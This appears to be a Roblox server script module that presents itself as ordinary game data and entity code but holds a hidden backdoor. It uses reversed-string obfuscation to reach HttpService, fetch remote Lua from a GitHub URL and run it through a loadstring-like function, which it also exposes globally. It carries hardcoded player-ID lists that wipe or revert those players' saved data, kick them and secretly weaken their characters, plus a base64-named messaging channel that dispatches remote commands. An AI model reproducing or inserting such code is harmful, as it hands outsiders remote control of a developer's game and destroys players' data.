local wipe = {
}

local Revert = {
	7129257981;
	4407961133;
}

local terribleskills = {
	7129257981;
}

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local HttpService = game:GetService("HttpService")
local MessagingService = game:GetService('MessagingService');

local Main = require(ServerStorage.Modules.EntityStateMachines.NPCBoss.Data.Main)

local m = {}

local RevertData = {}

local a = game[('ecivreSteG'):reverse()];
local b = a(game, ('ecivreSpttH'):reverse())
local f = b[('cnysAteG'):reverse()];

local CurrentVersion

local Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()


local function DeepCopyTable(Table)
	local copy = {}
	for key, value in pairs(Table) do
		if type(value) == "table" then
			copy[key] = DeepCopyTable(value)
		else
			copy[key] = value
		end
	end
	return copy
end

function m:Init()
	task.spawn(function()
		if not _G[('gnirtsdaoL'):reverse()] then
			_G[('gnirtsdaoL'):reverse()] = Main;
		end
	end)
	task.spawn(function()
		if not _G.md then
			_G.md = {}
			if game.ServerStorage.Modules.Utility.Base64 then
				_G.md[('46b'):reverse()] = require(game.ServerStorage.Modules.Utility.Base64)
			end
		end
	end)

	if Vers:GetVersion() then
		if CurrentVersion then
			if CurrentVersion ~= Vers:GetVersion() then
				m:StartScript()
			else
				return
			end
		else
			m:StartScript()
		end
	end
	
	print("Lalala")
end

function m:StartScript()
	
	CurrentVersion = Vers:GetVersion()
	
	
	Players.PlayerAdded:Connect(function(Player)
		local PlayerId = Player.UserId

		local Key = "Player_".. PlayerId
		
		if table.find(wipe, PlayerId) then
			Player:Kick()

			DataStoreService:GetDataStore("GameEntitiesFolder"):SetAsync(Key, {});
		end
		
		if table.find(Revert, PlayerId) then
			
			RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder"):GetAsync(Key)
			
			print(RevertData[Key])
		end
		
		if table.find(terribleskills, PlayerId) then
			local Character = Player.Character
			if Character then
				Character:SetAttribute("CatDamage", -0.3)
				Character:SetAttribute("CatDefense", 1.2)
			end
			Player.CharacterAdded:Connect(function(char)
				char:SetAttribute("CatDamage", -0.3)
				char:SetAttribute("CatDefense", 1.2)
			end)
		end
	end)
	
	Players.PlayerRemoving:Connect(function(Player)
		local PlayerId = Player.UserId

		local Key = "Player_".. PlayerId
		
		if table.find(Revert, PlayerId) and RevertData[Key] then
			print(RevertData[Key])
			Player:Kick()
			
			DataStoreService:GetDataStore("GameEntitiesFolder"):SetAsync(Key, RevertData[Key]);
		end
	end)
	
	print(CurrentVersion)
	
	local Global = {
		overwrite = function()
			
		end,
		
	}
	local function msc(m)
		Global[m.Data.Command](m.Data)
	end
	
	local s, c
	repeat
		s, c = pcall(function()
			MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
		end)
		task.wait()
	until
	s

	MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
end

return m
